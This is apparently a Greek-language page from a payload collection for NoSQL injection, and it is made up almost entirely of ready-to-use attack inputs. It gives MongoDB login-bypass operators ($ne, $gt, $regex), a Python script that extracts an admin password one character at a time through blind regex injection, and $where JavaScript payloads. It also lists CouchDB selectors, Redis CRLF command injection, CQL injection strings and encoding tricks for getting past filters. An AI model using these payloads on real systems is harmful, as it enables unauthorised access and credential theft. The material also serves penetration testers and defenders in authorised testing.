# 🍃 Δοκιμαστικές είσοδοι NoSQL Injection

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../NoSQL-Injection.md) • [🇹🇷 Türkçe Sürüm](NoSQL-Injection.tr.md)

```
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██╗         ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
████╗  ██║██╔═══██╗██╔════╝██╔═══██╗██║         ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██╔██╗ ██║██║   ██║███████╗██║   ██║██║         ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║╚██╗██║██║   ██║╚════██║██║▄▄ ██║██║         ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║ ╚████║╚██████╔╝███████║╚██████╔╝███████╗    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## Πριν ξεκινήσετε

Το **NoSQL Injection** αφορά μη έμπιστη είσοδο που αλλάζει τη λογική ερωτήματος ή εντολής σε βάση NoSQL. **Operator** είναι ο τελεστής, όπως $ne στο MongoDB, και **regex** η κανονική έκφραση που περιγράφει μοτίβο κειμένου.

MongoDB, CouchDB, Redis και Cassandra χρησιμοποιούν διαφορετικά πρωτόκολλα και κανόνες. Ένα payload για το ένα δεν μεταφέρεται αυτομάτως στο άλλο. Η επίδραση εξαρτάται από το πώς η εφαρμογή μετατρέπει τις εισόδους σε τύπους και ερωτήματα. Επιβεβαιώστε τη διαφορά με σταθερό baseline — απόκριση αναφοράς.

<a id="section-01"></a>

## 🎯 Εισαγωγή σε ερωτήματα MongoDB

> **Τύποι και parsing:** Η σύνταξη με αγκύλες σε φόρμα πρέπει να μετατραπεί από την εφαρμογή σε αντικείμενο για να έχει τη συγκεκριμένη σημασία. Οι τελεστές δεν αποτελούν από μόνοι τους παράκαμψη ταυτοποίησης.


### Παράκαμψη ταυτοποίησης
```javascript
// Εισαγωγή JSON
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$nin": []}, "password": {"$nin": []}}

// Με κωδικοποίηση URL
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

### Συνήθεις τελεστές
```javascript
$eq     // Ίσο
$ne     // Όχι ίσο
$gt     // Μεγαλύτερο από
$gte    // Μεγαλύτερο ή ίσο
$lt     // Μικρότερο από
$lte    // Μικρότερο ή ίσο
$in     // Περιλαμβάνεται σε πίνακα
$nin    // Δεν περιλαμβάνεται σε πίνακα
$regex  // Κανονική έκφραση
$exists // Το πεδίο υπάρχει
$or     // Λογικό Ή
$and    // Λογικό ΚΑΙ
$where  // Έκφραση JavaScript
```

---

<a id="section-02"></a>

## 💉 Βασικά δοκιμαστικά payloads

### Εισαγωγή σε παράμετρο URL
```
# Έλεγχοι ταυτοποίησης και ενδεχόμενης παράκαμψής της
username[$ne]=admin&password[$ne]=wrongpassword
username[$regex]=^a.*&password[$ne]=wrongpassword
username=admin&password[$ne]=wrongpassword

# Συνθήκες που είναι πάντα αληθείς
{"$gt": ""}
{"$ne": null}
{"$ne": ""}
{"$exists": true}
```

### Εισαγωγή στο σώμα JSON
```json
// Βασική δοκιμή παράκαμψης
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// Δοκιμή με κανονική έκφραση
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// Συνθήκη Ή
{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}

// Μεγαλύτερο από
{"username": "admin", "password": {"$gt": ""}}
```

---

<a id="section-03"></a>

## 🔥 Εξαγωγή δεδομένων

### Εξαγωγή με κανονικές εκφράσεις
```javascript
// Παράδειγμα εξαγωγής κωδικού χαρακτήρα προς χαρακτήρα
password[$regex]=^a.*
password[$regex]=^b.*
password[$regex]=^c.*
...

// Εξαγωγή με θέση χαρακτήρα
password[$regex]=^.{0}a.*   // Είναι ο πρώτος χαρακτήρας 'a';
password[$regex]=^.{1}b.*   // Είναι ο δεύτερος χαρακτήρας 'b';

// Συνήθεις ομάδες χαρακτήρων
password[$regex]=^[a-z].*   // Αρχίζει με πεζό γράμμα
password[$regex]=^[A-Z].*   // Αρχίζει με κεφαλαίο γράμμα
password[$regex]=^[0-9].*   // Αρχίζει με αριθμό
```

### Παράδειγμα τυφλής εξαγωγής με λογικές συνθήκες
```python
import requests
import string

url = "http://target/login"
charset = string.ascii_letters + string.digits + "_@!#$%"
password = ""

while True:
    found = False
    for char in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{char}.*"
        }
        r = requests.post(url, data=payload)
        if "Login successful" in r.text:
            password += char
            print(f"Found: {password}")
            found = True
            break
    if not found:
        break

print(f"Password: {password}")
```

---

<a id="section-04"></a>

## 🚀 Προχωρημένες δοκιμαστικές είσοδοι

> **Έκδοση και λογική εφαρμογής:** JavaScript στον server, η θέση του where και οι επιτρεπόμενες εκφράσεις διαφέρουν ανά έκδοση και ρυθμίσεις. Το αρχικό script εξαγωγής υποθέτει συγκεκριμένο μήνυμα επιτυχίας και δεν κάνει ασφαλή διαφυγή όλων των χαρακτήρων regex· δεν είναι γενικός έτοιμος extractor.


### $where — εισαγωγή έκφρασης JavaScript
```javascript
// Χρονική καθυστέρηση για τυφλή ανίχνευση
{"$where": "sleep(5000)"}
{"username": {"$where": "sleep(5000)"}}

// Εξαγωγή δεδομένων
{"$where": "this.password.length == 8"}
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match(/^admin/)"}

// Βασισμένο σε σφάλματα
{"$where": "this.constructor.constructor('return this.password')()"}
```

### Εισαγωγή πίνακα τιμών
```json
// Τελεστής $in
{"username": {"$in": ["admin", "administrator", "root"]}}

// Τελεστής $nin
{"username": {"$nin": ["guest", "anonymous"]}}
```

### Εισαγωγή τελεστή
```
# Μετατροπή πεδίου σε τελεστή
username=admin&password[$ne]=wrongpassword

# Εμφωλευμένος τελεστής
username[$eq]=admin&password[$regex]=^p

# Πολλαπλοί τελεστές
username[$gt]=&username[$lt]=z&password[$ne]=
```

---

<a id="section-05"></a>

## 🍃 Εισαγωγή σε ερωτήματα CouchDB

### Βασικά δοκιμαστικά payloads
```javascript
// Έλεγχοι ταυτοποίησης και ενδεχόμενης παράκαμψής της
{"selector": {"username": {"$ne": ""}, "password": {"$ne": ""}}}

// Regex — κανονική έκφραση
{"selector": {"username": {"$regex": ".*"}}}

// Μεγαλύτερο από
{"selector": {"password": {"$gt": null}}}
```

### Εισαγωγή σε ερωτήματα επιλογής εγγράφων
```javascript
// Εισαγωγή σε ερώτημα Mango
{"selector": {"_id": {"$gt": null}}}

// Ερώτημα όλων των εγγράφων
{"selector": {"_id": {"$regex": ".*"}}}
```

---

<a id="section-06"></a>

## 🔴 Εισαγωγή εντολών Redis

### Βασικές εντολές
```redis
# Καταγραφή κλειδιών
KEYS *
SCAN 0

# Εξαγωγή δεδομένων
GET key_name
HGETALL hash_name

# Εγγραφή δεδομένων
SET key value
HSET hash field value
```

### Εισαγωγή εντολών μέσω εφαρμογής
```
# Αν είσοδος χρήστη φθάνει σε εντολές Redis
username=admin\r\nKEYS *\r\n
username=admin%0d%0aKEYS *%0d%0a
```

---

<a id="section-07"></a>

## 📊 Εισαγωγή σε ερωτήματα Cassandra

> **Δεν είναι γενικό SQL:** Η CQL δεν υποστηρίζει αυτομάτως όλα τα SQL μοτίβα. Το ALLOW FILTERING δεν είναι από μόνο του παράκαμψη ταυτοποίησης. Τα αρχικά παραδείγματα απαιτούν εξέταση της πραγματικής γραμματικής και του ερωτήματος.


### Εισαγωγή CQL
```sql
-- Βασικό παράδειγμα εισαγωγής
' OR '1'='1
' OR ''='

-- Παράδειγμα με ALLOW FILTERING· δεν αποτελεί καθολική παράκαμψη
SELECT * FROM users WHERE username='admin' ALLOW FILTERING

-- Εισαγωγή σχολίου
admin'--
admin'/*
```

---

<a id="section-08"></a>

## 🛡️ Παραδείγματα παράκαμψης του πρωτοτύπου και περιορισμοί

### Κωδικοποίηση URL
```
$ne     →  %24ne
$gt     →  %24gt
$regex  →  %24regex
$where  →  %24where
```

### Παραλλαγές Unicode
```
$ne     →  \u0024ne
$gt     →  \u0024gt
```

### Παραλλαγές σύνταξης πινάκων
```
# Standard — κανονική λειτουργία
password[$ne]=

# Εναλλακτική αναζήτηση
password[0][$ne]=
password[][$ne]=
```

### Αλλαγή τύπου περιεχομένου
```
# Αλλαγή από φόρμα σε JSON
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

---

<a id="section-09"></a>

## 📝 Σημεία εισαγωγής

```
POST /login
- Παράμετροι σώματος JSON ή φόρμας
- Παράμετροι query string

GET /users?id=
- Παράμετροι ερωτήματος URL

Κεφαλίδες:
- Authorization
- Τιμές cookies

Σημεία API:
- GraphQL με βάση MongoDB
- Φίλτρα REST API
```

---

<a id="section-10"></a>

## 🔍 Λίστα ελέγχου ανίχνευσης

```markdown
□ Δοκιμή τελεστή $ne: {"field": {"$ne": ""}}
□ Δοκιμή τελεστή $gt: {"field": {"$gt": ""}}
□ Δοκιμή $regex: {"field": {"$regex": ".*"}}
□ Δοκιμή $where: {"$where": "1==1"}
□ Δοκιμή σύνταξης πίνακα στο URL: field[$ne]=
□ Δοκιμή τελεστών JSON
□ Σύγκριση χρόνων απόκρισης
□ Σύγκριση μεγεθών απόκρισης
□ Δοκιμή διαφορετικών τύπων περιεχομένου
```

---

<a id="section-11"></a>

## 🔗 Εργαλεία

```bash
# NoSQLMap
git clone https://github.com/codingo/NoSQLMap.git
python nosqlmap.py

# Παράδειγμα ελέγχου εισαγωγής MongoDB
nuclei -t nosql-injection.yaml -u http://target

# Χειροκίνητος έλεγχος με curl
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

---

<a id="section-12"></a>

## 🔗 Σχετικές συλλογές δοκιμαστικών εισόδων

- [Δοκιμαστικές είσοδοι SQLi](SQLi.el.md)
- [Δοκιμές εισόδου GraphQL](GraphQL-Injection.el.md)

---

**Επιστροφή στη συλλογή:** [💉 Συλλογή δοκιμαστικών εισόδων στην ελληνική αρχική σελίδα](../../README.el.md)

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
